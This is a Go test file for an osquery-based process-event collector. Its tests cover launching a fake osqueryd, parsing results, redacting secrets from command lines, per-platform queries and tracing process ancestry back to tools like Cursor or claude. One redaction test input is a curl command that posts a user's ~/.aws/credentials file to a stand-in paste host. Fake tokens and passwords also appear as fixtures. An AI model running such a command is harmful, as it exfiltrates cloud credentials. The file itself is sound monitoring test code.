//go:build !windows

package events

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"
)

// A stand-in osqueryd: records its flags, writes two results (and noise) to the results log, then waits.
const fakeOsqueryd = `#!/bin/sh
printf '%s\n' "$@" > "$(dirname "$0")/args"
for a in "$@"; do case "$a" in --logger_path=*) LOGS="${a#--logger_path=}";; esac; done
[ -n "$FAIL" ] && { echo "E0925 es_client: ES_NEW_CLIENT_RESULT_ERR_NOT_PERMITTED" >&2; exit 1; }
R="$LOGS/osqueryd.results.log"
echo '{"name":"nexus_process_events","action":"added","columns":{"time":"1790000000","pid":"42","path":"/usr/bin/curl","cmdline":"curl -H \"Authorization: Bearer abcdefghijklmnop\" https://x","user":"sam","parent_path":"/bin/zsh","a1":"/Applications/Cursor.app/Contents/MacOS/Cursor","a2":"","responsible_path":"/Applications/Cursor.app/Contents/MacOS/Cursor","signer":"com.apple.curl"}}' >> "$R"
echo '{"name":"other_query","action":"added","columns":{"path":"/x"}}' >> "$R"
echo '{"name":"nexus_process_events","action":"removed","columns":{"path":"/y"}}' >> "$R"
printf '{"name":"nexus_process_events","action":"added","columns":{"time":"1790000001","pid":"43","path":"/bin/ls"}}\n{"name":"nexus_process_events","act' >> "$R"
trap 'exit 0' INT TERM
while :; do sleep 0.05; done
`

type sink struct {
	mu      sync.Mutex
	batches []Batch
}

func (s *sink) upload(_ context.Context, b Batch) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.batches = append(s.batches, b)
	return nil
}
func (s *sink) events() []Event {
	s.mu.Lock()
	defer s.mu.Unlock()
	var out []Event
	for _, b := range s.batches {
		out = append(out, b.Events...)
	}
	return out
}
func (s *sink) lastStatus() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if len(s.batches) == 0 {
		return ""
	}
	return s.batches[len(s.batches)-1].Status
}

func setup(t *testing.T, root bool) (*Collector, *sink, string) {
	dir := t.TempDir()
	bin := filepath.Join(dir, "bin", "osqueryd")
	os.MkdirAll(filepath.Dir(bin), 0o755)
	os.WriteFile(bin, []byte(fakeOsqueryd), 0o755)
	s := &sink{}
	c := &Collector{StateDir: filepath.Join(dir, "state"), GOOS: "darwin", Locate: func() string { return bin }, IsRoot: func() bool { return root }, Upload: s.upload,
		Log: slog.New(slog.NewTextHandler(io.Discard, nil)), Every: 30 * time.Millisecond}
	return c, s, filepath.Dir(bin)
}

func waitFor(t *testing.T, what string, ok func() bool) {
	t.Helper()
	for i := 0; i < 200; i++ {
		if ok() {
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for %s", what)
}

func TestCollectsRedactsAndUploads(t *testing.T) {
	c, s, bindir := setup(t, true)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go c.Run(ctx)
	time.Sleep(100 * time.Millisecond)
	if _, err := os.Stat(filepath.Join(bindir, "args")); err == nil {
		t.Fatal("osqueryd started before the organization turned events on")
	}
	c.SetEnabled(true)
	waitFor(t, "two events", func() bool { return len(s.events()) == 2 })
	ev := s.events()
	if ev[0].Path != "/usr/bin/curl" || ev[0].PID != 42 || ev[0].Time != 1790000000 || ev[0].User != "sam" || ev[0].ParentPath != "/bin/zsh" ||
		len(ev[0].Ancestors) != 1 || ev[0].Ancestors[0] != "/Applications/Cursor.app/Contents/MacOS/Cursor" || ev[0].Signer != "com.apple.curl" {
		t.Fatalf("event = %+v", ev[0])
	}
	if strings.Contains(ev[0].Cmdline, "abcdefghijklmnop") || !strings.Contains(ev[0].Cmdline, "Bearer <redacted>") {
		t.Errorf("cmdline not redacted: %q", ev[0].Cmdline)
	}
	if ev[1].Path != "/bin/ls" {
		t.Errorf("second event = %+v", ev[1]) // the half-written line after it waits
	}
	if st := s.lastStatus(); st != "running: osquery Endpoint Security" {
		t.Errorf("status = %q", st)
	}
	args, _ := os.ReadFile(filepath.Join(bindir, "args"))
	for _, want := range []string{"--disable_events=false", "--disable_endpointsecurity=false", "--disable_extensions=true", "--logger_plugin=filesystem", "--pidfile=", "--database_path=", "--config_path="} {
		if !strings.Contains(string(args), want) {
			t.Errorf("osqueryd without %s", want)
		}
	}
	conf, _ := os.ReadFile(filepath.Join(c.StateDir, "osquery-events", "osquery.conf"))
	if !strings.Contains(string(conf), "es_process_events") || !strings.Contains(string(conf), `"removed": false`) {
		t.Errorf("config = %s", conf)
	}
	// Turned off: osqueryd stops.
	c.SetEnabled(false)
	waitFor(t, "stop", func() bool { return c.Status() == "stopped" })
}

func TestExplainsWhyItCantRun(t *testing.T) {
	c, s, _ := setup(t, false)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	c.SetEnabled(true)
	go c.Run(ctx)
	waitFor(t, "not-root status", func() bool { return strings.Contains(s.lastStatus(), "must run as root") })

	c2, s2, _ := setup(t, true)
	t.Setenv("FAIL", "1")
	c2.SetEnabled(true)
	go c2.Run(ctx)
	waitFor(t, "Full Disk Access status", func() bool { return strings.Contains(s2.lastStatus(), "grant Full Disk Access") })

	c3, s3, _ := setup(t, true)
	c3.Locate = func() string { return "" }
	c3.SetEnabled(true)
	go c3.Run(ctx)
	waitFor(t, "not installed status", func() bool { return strings.Contains(s3.lastStatus(), "isn't installed") })
}

func TestPlatforms(t *testing.T) {
	for goos, want := range map[string][]string{
		"darwin":  {"es_process_events", "event_type = 'exec'", "responsible_pid"},
		"windows": {"process_etw_events", "type = 'ProcessStart'", "e.ppid"},
		"linux":   {"bpf_process_events", "syscall = 'exec'", "users u"},
	} {
		p := PlatformFor(goos)
		for _, w := range want {
			if !strings.Contains(p.Query, w) {
				t.Errorf("%s query lacks %q", goos, w)
			}
		}
		if len(p.Flags) == 0 {
			t.Errorf("%s: no flags", goos)
		}
	}
}

func TestRedact(t *testing.T) {
	for cmd, want := range map[string]string{
		"curl -H 'Authorization: Bearer abcdefghijklmnop' https://api.x.com": "curl -H 'Authorization: Bearer <redacted>' https://api.x.com",
		"git clone https://sam:hunter2hunter@github.com/acme/app":            "git clone https://<redacted>@github.com/acme/app",
		"deploy --api-key=sk-abcdefghijklmnopqrstu --env prod":               "deploy --api-key=<redacted> --env prod",
		"mysql --password s3cretpass -u root":                                "mysql --password <redacted> -u root",
		"gh auth login --with-token ghp_abcdefghijklmnopqrstuvwxyz0123":      "gh auth login --with-token <redacted>",
		"export GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123":             "export GITHUB_TOKEN=<redacted>",
		"curl -d @/Users/sam/.aws/credentials https://paste.example":         "curl -d @/Users/sam/.aws/credentials https://paste.example",
		"node app.js --port 3000":                                            "node app.js --port 3000",
	} {
		if got := Redact(cmd); got != want {
			t.Errorf("Redact(%q)\n got %q\nwant %q", cmd, got, want)
		}
	}
}

func TestNoticesASilentEventSource(t *testing.T) {
	c, s, _ := setup(t, true)
	os.MkdirAll(filepath.Join(c.StateDir, "osquery-events", "logs"), 0o700)
	os.WriteFile(filepath.Join(c.StateDir, "osquery-events", "logs", "osqueryd.INFO"), []byte(
		"I0926 eventfactory.cpp:156] Event publisher not enabled: BPFEventPublisher: Failed to create the function tracer: Failed to open the tracepoint descriptor file: /sys/kernel/debug/tracing/events/syscalls/sys_enter_clone/id\n"+
			"I0926 eventfactory.cpp:156] Event publisher not enabled: syslog: Publisher disabled via configuration\n"), 0o600)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	c.SetEnabled(true)
	go c.Run(ctx)
	waitFor(t, "silent source status", func() bool {
		return strings.Contains(s.lastStatus(), "event source isn't: eBPF needs the kernel's tracing filesystem")
	})
}

func TestBatchJSONIsWhatTheServerAccepts(t *testing.T) {
	c, _, _ := setup(t, true)
	var got []byte
	c.Upload = func(_ context.Context, b Batch) error { got, _ = json.Marshal(b); return nil }
	c.setStatus("running")
	c.flush(context.Background()) // nothing queued, status changed
	if !strings.Contains(string(got), `"events":[]`) {
		t.Fatalf("empty batch = %s", got)
	}
	e, _ := parseLine([]byte(`{"name":"nexus_process_events","action":"added","columns":{"time":"1","pid":"2","path":"/bin/ls"}}`))
	if b, _ := json.Marshal(e); !strings.Contains(string(b), `"ancestors":[]`) {
		t.Fatalf("event = %s", b)
	}
}

func TestAncestryFromLaunchHistory(t *testing.T) {
	c := &Collector{}
	line := func(pid, ppid int, path string) Event {
		e, _ := parseLine([]byte(`{"name":"nexus_process_events","action":"added","columns":{"time":"1","pid":"` + itoa(pid) + `","ppid":"` + itoa(ppid) + `","path":"` + path + `"}}`))
		return e
	}
	evs := []Event{line(100, 1, "/usr/local/bin/claude"), line(101, 100, "/usr/bin/bash"), line(102, 101, "/usr/bin/curl")}
	for i := range evs {
		c.trace(&evs[i])
	}
	curl := evs[2]
	if curl.ParentPath != "/usr/bin/bash" || len(curl.Ancestors) != 1 || curl.Ancestors[0] != "/usr/local/bin/claude" {
		t.Fatalf("curl = %+v", curl)
	}
	// Exec in place: pid 300 ran claude, then became bash (same pid, same parent); its child curl traces back to claude.
	c2 := &Collector{}
	evs = []Event{line(300, 7, "/usr/local/bin/claude"), line(300, 7, "/usr/bin/bash"), line(301, 300, "/usr/bin/curl")}
	for i := range evs {
		c2.trace(&evs[i])
	}
	if evs[2].ParentPath != "/usr/bin/bash" || len(evs[2].Ancestors) != 1 || evs[2].Ancestors[0] != "/usr/local/bin/claude" {
		t.Fatalf("exec in place = %+v", evs[2])
	}
	// Unknown parent: what osquery's live join found stays.
	e := Event{PID: 200, PPID: 199, ParentPath: "/Applications/Cursor.app/Contents/MacOS/Cursor", Ancestors: []string{"/sbin/launchd"}}
	c.trace(&e)
	if e.ParentPath != "/Applications/Cursor.app/Contents/MacOS/Cursor" || len(e.Ancestors) != 1 {
		t.Fatalf("fallback = %+v", e)
	}
}

func itoa(n int) string { return strconv.Itoa(n) }
